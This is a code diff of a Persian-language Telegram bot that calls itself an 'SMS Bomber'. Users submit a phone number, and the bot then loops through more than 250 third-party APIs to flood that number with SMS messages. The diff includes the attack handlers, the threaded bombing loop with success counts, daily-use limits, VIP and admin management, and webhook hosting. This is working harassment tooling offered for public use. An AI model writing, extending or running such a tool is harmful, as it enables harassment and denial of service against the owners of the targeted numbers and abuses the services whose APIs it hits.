-@bot.message_handler(func=lambda m: m.text == '📈 آمار کلی')
-def global_stats(m):
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        total_users = c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily").fetchone()[0] or 0
-        today = datetime.now().date().isoformat()
-        today_users = c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily WHERE date = ?", (today,)).fetchone()[0] or 0
-        total_msgs = c.execute("SELECT SUM(count) FROM user_messages").fetchone()[0] or 0
-        conn.close()
-        
-        msg = f"""📊 **آمار کلی:**
-👥 کل: {total_users}
-📅 امروز: {today_users}
-⭐ VIP: {len(get_all_vips())}
-📨 درخواست‌ها: {total_msgs}
-📡 API: {len(APIS)}
-👑 {CREATOR_USERNAME}"""
-        bot.reply_to(m, msg, parse_mode="Markdown")
-    except:
-        bot.reply_to(m, "❌ خطا در دریافت آمار.")
-
-# ========== حمله جدید ==========
-@bot.message_handler(func=lambda m: m.text == '🚀 حمله جدید')
-def new_attack(m):
-    user_id = m.chat.id
-    limit = get_daily_limit(user_id)
-    
-    if not bot_active and not is_admin(user_id):
-        return bot.reply_to(m, "⛔ ربات غیرفعال است.")
-    
-    if not check_daily_limit(user_id) and not is_admin(user_id):
-        return bot.reply_to(m, f"⚠️ محدودیت تمام! فردا {limit} بار")
-    
-    last_use = get_user_last_use(user_id)
-    if last_use and time.time() - last_use < 120 and not is_admin(user_id):
-        return bot.reply_to(m, f"⏳ {int(120 - (time.time() - last_use))} ثانیه صبر کن.")
-    
-    if user_id in active_attacks:
-        return bot.reply_to(m, "⚠️ حمله فعال داری!")
-    
-    user_states[user_id] = "waiting_for_phone"
-    remaining = limit - get_user_daily(user_id)
-    bot.reply_to(m, f"📱 شماره رو بفرست:\nمثلاً 09123456789\n📊 باقی‌مانده: {remaining}")
-
-# ========== دریافت شماره ==========
-@bot.message_handler(func=lambda m: user_states.get(m.chat.id) == "waiting_for_phone")
-def get_phone(m):
-    user_id = m.chat.id
-    phone = m.text.strip()
-    
-    if not re.match(r'^09\d{9}$', phone):
-        bot.reply_to(m, "❌ شماره نامعتبر!")
-        del user_states[user_id]
-        return
-    
-    if is_phone_blocked(phone):
-        bot.reply_to(m, "❌ خطای 404")
-        del user_states[user_id]
-        return
-    
-    del user_states[user_id]
-    set_user_last_use(user_id, int(time.time()))
-    active_attacks[user_id] = True
-    
-    increment_user_daily(user_id)
-    increment_user_messages(user_id)
-    
-    remaining = get_daily_limit(user_id) - get_user_daily(user_id)
-    msg = bot.reply_to(m, f"✅ شماره {phone} دریافت شد.\n🔥 در حال ارسال...\n📊 باقی‌مانده: {remaining}")
-    
-    threading.Thread(target=run_attack, args=(phone, user_id, msg.message_id)).start()
-
-# ========== توقف حمله ==========
-@bot.message_handler(func=lambda m: m.text == '⛔ توقف حمله')
-def stop_attack(m):
-    user_id = m.chat.id
-    if user_id in active_attacks:
-        active_attacks[user_id] = False
-        bot.reply_to(m, "⛔ حمله متوقف شد.")
+    if check_membership(user_id):
+        bot.answer_callback_query(call.id, "✅ عضویت شما تایید شد!")
+        bot.delete_message(call.message.chat.id, call.message.message_id)
     else:
-        bot.reply_to(m, "❌ حمله فعالی نیست.")
+        bot.answer_callback_query(call.id, "❌ شما هنوز عضو نشده‌اید!", show_alert=True)
 
-# ========== پنل مدیریت ==========
-@bot.message_handler(func=lambda m: m.text == '👑 پنل مدیریت' and is_admin(m.from_user.id))
-def admin_panel(m):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add('📊 آمار مدیریت', '📋 لیست VIPها', '🔴 خاموش/روشن')
-    markup.add('👥 مدیریت ادمین‌ها', '⭐ مدیریت VIPها', '🔙 برگشت')
-    bot.reply_to(m, "👑 پنل مدیریت:", reply_markup=markup)
+@bot.message_handler(func=lambda m: m.text == "🚀 شروع بمباران")
+@membership_required
+def ask_phone(message):
+    user_id = message.from_user.id
+    
+    # بررسی محدودیت روزانه
+    can_use, daily = check_daily_limit(user_id)
+    if not can_use:
+        bot.send_message(
+            message.chat.id,
+            f"❌ شما امروز {daily} بار استفاده کرده‌اید.\n"
+            "محدودیت روزانه 5 بار است.\n"
+            "فردا دوباره تلاش کنید."
+        )
+        return
+    
+    if user_processes.get(message.chat.id):
+        bot.send_message(message.chat.id, "❌ یک فرآیند در حال اجراست")
+        return
+    
+    msg = bot.send_message(message.chat.id, "📱 شماره را وارد کنید (مثال: 09123456789):")
+    bot.register_next_step_handler(msg, process_phone)
 
-# ========== آمار مدیریت ==========
-@bot.message_handler(func=lambda m: m.text == '📊 آمار مدیریت' and is_admin(m.from_user.id))
-def admin_stats(m):
-    try:
-        conn = sqlite3.connect('bot_data.db')
-        c = conn.cursor()
-        total = c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily").fetchone()[0] or 0
-        today = datetime.now().date().isoformat()
-        today_u = c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily WHERE date = ?", (today,)).fetchone()[0] or 0
-        msgs = c.execute("SELECT SUM(count) FROM user_messages").fetchone()[0] or 0
-        active_u = c.execute("SELECT COUNT(DISTINCT user_id) FROM user_daily WHERE count > 0").fetchone()[0] or 0
-        conn.close()
+def process_phone(message):
+    chat_id = message.chat.id
+    user_id = message.from_user.id
+    phone = message.text.strip()
+    
+    if not phone.startswith('09') or len(phone) != 11 or not phone.isdigit():
+        bot.send_message(chat_id, "❌ شماره نامعتبر است")
+        return
+    
+    if is_phone_protected(phone):
+        bot.send_message(chat_id, "❌ این شماره در لیست سیاه قرار دارد")
+        return
+    
+    # ثبت آمار
+    update_user_count(user_id, message.from_user.username or "", message.from_user.first_name or "")
+    
+    user_processes[chat_id] = True
+    msg = bot.send_message(chat_id, f"🔰 شروع برای {mask_phone(phone)}...")
+    
+    thread = threading.Thread(target=bombing_process, args=(chat_id, phone, msg.message_id))
+    thread.daemon = True
+    thread.start()
+
+def bombing_process(chat_id, phone, msg_id):
+    apis = get_all_apis(phone)
+    total = len(apis)
+    success = 0
+    fail = 0
+    
+    for i, api in enumerate(apis, 1):
+        if not user_processes.get(chat_id):
+            break
         
-        status = "✅ فعال" if bot_active else "❌ غیرفعال"
-        msg = f"""📊 **آمار مدیریت:**
-👤 کل: {total}
-📅 امروز: {today_u}
-⚡ فعال: {active_u}
-⭐ VIP: {len(get_all_vips())}
-👑 ادمین: {len(get_all_admins())}
-📨 پیام‌ها: {msgs}
-📡 API: {len(APIS)}
-🔰 {status}
-👑 {CREATOR_USERNAME}"""
-        bot.reply_to(m, msg, parse_mode="Markdown")
-    except:
-        bot.reply_to(m, "❌ خطا در دریافت آمار.")
-
-# ========== لیست VIPها ==========
-@bot.message_handler(func=lambda m: m.text == '📋 لیست VIPها' and is_admin(m.from_user.id))
-def vip_list(m):
-    vips = get_all_vips()
-    if not vips:
-        return bot.reply_to(m, "📋 لیست VIPها خالی است.")
-    text = "📋 **VIPها:**\n" + "\n".join([f"⭐ `{uid}`" for uid in vips]) + f"\n👑 {CREATOR_USERNAME}"
-    bot.reply_to(m, text, parse_mode="Markdown")
-
-# ========== خاموش/روشن ==========
-@bot.message_handler(func=lambda m: m.text == '🔴 خاموش/روشن' and is_admin(m.from_user.id))
-def admin_toggle(m):
-    global bot_active
-    bot_active = not bot_active
-    bot.reply_to(m, f"✅ ربات {'روشن' if bot_active else 'خاموش'} شد.")
-
-# ========== مدیریت ادمین‌ها ==========
-@bot.message_handler(func=lambda m: m.text == '👥 مدیریت ادمین‌ها' and is_admin(m.from_user.id))
-def manage_admins(m):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add('➕ افزودن ادمین', '➖ حذف ادمین', '📋 لیست ادمین‌ها', '🔙 برگشت')
-    bot.reply_to(m, "👥 مدیریت ادمین‌ها:", reply_markup=markup)
-
-# ========== مدیریت VIPها ==========
-@bot.message_handler(func=lambda m: m.text == '⭐ مدیریت VIPها' and is_admin(m.from_user.id))
-def manage_vips(m):
-    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
-    markup.add('➕ افزودن VIP', '➖ حذف VIP', '📋 لیست VIPها', '🔙 برگشت')
-    bot.reply_to(m, "⭐ مدیریت VIPها:", reply_markup=markup)
-
-# ========== لیست ادمین‌ها ==========
-@bot.message_handler(func=lambda m: m.text == '📋 لیست ادمین‌ها' and is_admin(m.from_user.id))
-def list_admins(m):
-    admins = get_all_admins()
-    text = "📋 **ادمین‌ها:**\n" + "\n".join([f"{'⭐' if uid in ADMIN_IDS else ''}👑 `{uid}`" for uid in admins]) + f"\n👑 {CREATOR_USERNAME}"
-    bot.reply_to(m, text, parse_mode="Markdown")
-
-# ========== افزودن ادمین ==========
-@bot.message_handler(func=lambda m: m.text == '➕ افزودن ادمین' and is_admin(m.from_user.id))
-def add_admin_start(m):
-    msg = bot.reply_to(m, "🔹 **آیدی عددی کاربر را وارد کنید:**", parse_mode="Markdown")
-    user_states[m.chat.id] = ("waiting_for_add_admin", msg.message_id)
-
-# ========== حذف ادمین ==========
-@bot.message_handler(func=lambda m: m.text == '➖ حذف ادمین' and is_admin(m.from_user.id))
-def remove_admin_start(m):
-    msg = bot.reply_to(m, "🔹 **آیدی عددی ادمین را وارد کنید:**", parse_mode="Markdown")
-    user_states[m.chat.id] = ("waiting_for_remove_admin", msg.message_id)
-
-# ========== افزودن VIP ==========
-@bot.message_handler(func=lambda m: m.text == '➕ افزودن VIP' and is_admin(m.from_user.id))
-def add_vip_start(m):
-    msg = bot.reply_to(m, "🔹 **آیدی عددی کاربر را وارد کنید:**", parse_mode="Markdown")
-    user_states[m.chat.id] = ("waiting_for_add_vip", msg.message_id)
-
-# ========== حذف VIP ==========
-@bot.message_handler(func=lambda m: m.text == '➖ حذف VIP' and is_admin(m.from_user.id))
-def remove_vip_start(m):
-    msg = bot.reply_to(m, "🔹 **آیدی عددی VIP را وارد کنید:**", parse_mode="Markdown")
-    user_states[m.chat.id] = ("waiting_for_remove_vip", msg.message_id)
-
-# ========== هندلر مدیریت ==========
-@bot.message_handler(func=lambda m: user_states.get(m.chat.id) and user_states[m.chat.id][0] in 
-                     ["waiting_for_add_admin", "waiting_for_remove_admin", 
-                      "waiting_for_add_vip", "waiting_for_remove_vip"])
-def handle_admin_edit(m):
-    state = user_states.get(m.chat.id)
-    if not state or not m.text.isdigit():
-        return bot.reply_to(m, "❌ عدد معتبر وارد کنید.")
-    
-    target_id = int(m.text)
-    action = state[0]
-    
-    if action == "waiting_for_add_admin":
-        bot.reply_to(m, f"✅ کاربر {target_id} به ادمین‌ها اضافه شد." if add_admin(target_id) else f"❌ خطا در افزودن {target_id}.")
-    elif action == "waiting_for_remove_admin":
-        if target_id in ADMIN_IDS:
-            bot.reply_to(m, "❌ ادمین ثابت قابل حذف نیست.")
+        ok, _ = send_request(api['url'], api['data'], api.get('headers'), api.get('method', 'POST'))
+        
+        if ok:
+            success += 1
         else:
-            bot.reply_to(m, f"✅ کاربر {target_id} از ادمین‌ها حذف شد." if remove_admin(target_id) else f"❌ خطا در حذف {target_id}.")
-    elif action == "waiting_for_add_vip":
-        bot.reply_to(m, f"✅ کاربر {target_id} به VIPها اضافه شد." if add_vip(target_id) else f"❌ خطا در افزودن {target_id}.")
-    elif action == "waiting_for_remove_vip":
-        bot.reply_to(m, f"✅ کاربر {target_id} از VIPها حذف شد." if remove_vip(target_id) else f"❌ خطا در حذف {target_id}.")
+            fail += 1
+        
+        if i % 10 == 0 or i == total:
+            try:
+                bot.edit_message_text(
+                    f"🔰 پیشرفت: {int(i/total*100)}%\n"
+                    f"✅ موفق: {success}\n"
+                    f"❌ ناموفق: {fail}\n"
+                    f"🔄 {i}/{total}",
+                    chat_id, msg_id
+                )
+            except:
+                pass
+        
+        time.sleep(random.uniform(0.2, 0.5))
     
-    del user_states[m.chat.id]
+    bot.edit_message_text(
+        f"✅ پایان فرآیند\n\n"
+        f"✅ موفق: {success}\n"
+        f"❌ ناموفق: {fail}\n"
+        f"📊 نرخ موفقیت: {int(success/total*100)}%",
+        chat_id, msg_id
+    )
+    
+    user_processes.pop(chat_id, None)
 
-# ========== برگشت ==========
-@bot.message_handler(func=lambda m: m.text == '🔙 برگشت' and is_admin(m.from_user.id))
-def admin_back(m):
-    start(m)
+@bot.message_handler(func=lambda m: m.text == "📊 راهنما")
+def help_message(message):
+    text = (
+        "📚 راهنما:\n\n"
+        "1️⃣ روی دکمه شروع کلیک کنید\n"
+        "2️⃣ شماره را وارد کنید\n"
+        "3️⃣ منتظر بمانید\n\n"
+        "🔰 تعداد APIها: 250+\n"
+        "⏱ زمان تقریبی: 2-3 دقیقه\n"
+        "📊 محدودیت: 5 بار در روز\n\n"
+        "⚠️ استفاده مسئولانه"
+    )
+    bot.send_message(message.chat.id, text)
 
-# ========== ارتباط با سازنده ==========
-@bot.message_handler(func=lambda m: m.text == '📞 ارتباط با سازنده')
-def contact(m):
-    markup = types.ForceReply(selective=False)
-    msg = bot.reply_to(m, f"📝 **پیامت رو بنویس:**\n👑 {CREATOR_USERNAME}", reply_markup=markup, parse_mode="Markdown")
-    user_states[m.chat.id] = ("waiting_for_contact", msg.message_id)
+@bot.message_handler(func=lambda m: m.text == "📊 آمار من")
+def my_stats(message):
+    user_id = message.from_user.id
+    daily = get_daily_count(user_id)
+    
+    conn = sqlite3.connect('bot_data.db')
+    c = conn.cursor()
+    c.execute("SELECT total_count, join_date FROM users WHERE user_id = ?", (user_id,))
+    result = c.fetchone()
+    conn.close()
+    
+    total = result[0] if result else 0
+    join_date = result[1] if result else "نامشخص"
+    
+    text = (
+        f"📊 آمار شما:\n\n"
+        f"🆔 آیدی: {user_id}\n"
+        f"📅 تاریخ عضویت: {join_date}\n"
+        f"📊 استفاده امروز: {daily}/5\n"
+        f"🔰 کل استفاده: {total}\n"
+        f"✅ باقیمانده امروز: {5-daily}"
+    )
+    
+    bot.send_message(message.chat.id, text)
 
-@bot.message_handler(func=lambda m: user_states.get(m.chat.id) and user_states[m.chat.id][0] == "waiting_for_contact")
-def handle_contact_message(m):
-    state = user_states.get(m.chat.id)
-    if not state:
+@bot.message_handler(func=lambda m: m.text == "👑 پنل مدیریت")
+def admin_panel(message):
+    if not is_admin(message.from_user.id):
+        bot.send_message(message.chat.id, "⛔ دسترسی ندارید")
         return
     
-    vip = "⭐ VIP" if is_vip(m.from_user.id) else "👤 عادی"
-    user_info = f"از: {m.from_user.first_name} (ID: {m.from_user.id})\nوضعیت: {vip}"
+    conn = sqlite3.connect('bot_data.db')
+    c = conn.cursor()
     
-    del user_states[m.chat.id]
+    c.execute("SELECT COUNT(*) FROM users")
+    total_users = c.fetchone()[0]
     
-    for admin_id in get_all_admins():
-        try:
-            bot.send_message(admin_id, f"📨 **پیام جدید:**\n\n{user_info}\n\n📝 {m.text}\n\n👑 {CREATOR_USERNAME}", parse_mode="Markdown")
-        except:
-            pass
+    c.execute("SELECT COUNT(*) FROM users WHERE last_use = ?", (date.today().isoformat(),))
+    today_users = c.fetchone()[0]
     
-    bot.reply_to(m, f"✅ ارسال شد. به زودی پاسخ می‌دم.\n👑 {CREATOR_USERNAME}")
-
-# ========== پیام‌های ناشناخته ==========
-@bot.message_handler(func=lambda m: True)
-def fallback(m):
-    if user_states.get(m.chat.id):
-        return
+    c.execute("SELECT SUM(total_requests) FROM daily_stats")
+    total_requests = c.fetchone()[0] or 0
     
-    valid = ['🚀 حمله جدید', '📊 وضعیت من', '📈 آمار کلی', '⛔ توقف حمله', '📞 ارتباط با سازنده',
-             '👑 پنل مدیریت', '📊 آمار مدیریت', '📋 لیست VIPها', '🔴 خاموش/روشن',
-             '👥 مدیریت ادمین‌ها', '⭐ مدیریت VIPها', '➕ افزودن ادمین', '➖ حذف ادمین',
-             '📋 لیست ادمین‌ها', '➕ افزودن VIP', '➖ حذف VIP', '🔙 برگشت']
+    c.execute("SELECT date, total_requests FROM daily_stats ORDER BY date DESC LIMIT 7")
+    weekly = c.fetchall()
     
-    if m.text not in valid:
-        bot.reply_to(m, "⚠️ از دکمه‌های منو استفاده کن.")
+    conn.close()
+    
+    text = (
+        "👑 پنل مدیریت\n\n"
+        f"📊 آمار کلی:\n"
+        f"👥 کل کاربران: {total_users}\n"
+        f"📅 کاربران امروز: {today_users}\n"
+        f"🔰 کل درخواست‌ها: {total_requests}\n\n"
+        f"📈 آمار هفتگی:\n"
+    )
+    
+    for w in weekly:
+        text += f"  {w[0]}: {w[1]} درخواست\n"
+    
+    bot.send_message(message.chat.id, text)
 
-# ========== Flask ==========
-app = Flask(__name__)
+@bot.message_handler(commands=['stop'])
+def stop_process(message):
+    chat_id = message.chat.id
+    if chat_id in user_processes:
+        user_processes[chat_id] = False
+        bot.send_message(chat_id, "⛔ فرآیند متوقف شد")
+    else:
+        bot.send_message(chat_id, "⚠️ فرآیندی در حال اجرا نیست")
 
-@app.route('/')
-def home():
-    return f"🤖 {BOT_NAME} | API: {len(APIS)} | بات فعال"
+# ==================== اجرا ====================
 
-@app.route('/test')
-def test():
-    return "✅ OK", 200
-
-@app.route('/health')
-def health():
-    return "OK", 200
-
-@app.route('/setwebhook')
-def set_webhook():
-    try:
-        url = "https://hosawerdty.onrender.com/webhook"
-        bot.remove_webhook()
-        time.sleep(1)
-        return (f"✅ Webhook set to {url}" if bot.set_webhook(url=url) else "❌ Failed"), 200
-    except Exception as e:
-        return f"❌ Error: {e}", 500
-
-@app.route('/webhook', methods=['POST'])
-def webhook():
-    if request.headers.get('content-type') == 'application/json':
-        update = telebot.types.Update.de_json(request.get_data().decode('utf-8'))
-        bot.process_new_updates([update])
-        return 'OK', 200
-    return 'Forbidden', 403
-
-# ========== بیدار ماندن ==========
-def keep_alive():
-    while True:
-        try:
-            requests.get("https://www.google.com", timeout=5)
-            time.sleep(60)
-        except:
-            time.sleep(60)
-
-# ========== اجرا ==========
 if __name__ == "__main__":
     print("="*50)
-    print(f"🚀 {BOT_NAME}")
-    init_database()
-    print(f"📡 API: {len(APIS)} | 👑 ادمین‌ها: {ADMIN_IDS}")
+    print("🤖 ربات SMS Bomber - نسخه نهایی")
+    print("="*50)
+    print("✅ توکن: هش شده")
+    print("✅ شماره محافظت شده: هش شده")
+    print("✅ کانال: @death_star_sms_bomber")
+    print("✅ محدودیت: 5 بار در روز")
+    print("="*50)
     
-    threading.Thread(target=keep_alive, daemon=True).start()
-    port = int(os.environ.get('PORT', 10000))
-    app.run(host='0.0.0.0', port=port)
+    init_database()
+    
+    try:
+        bot.infinity_polling()
+    except Exception as e:
+        print(f"❌ خطا: {e}")
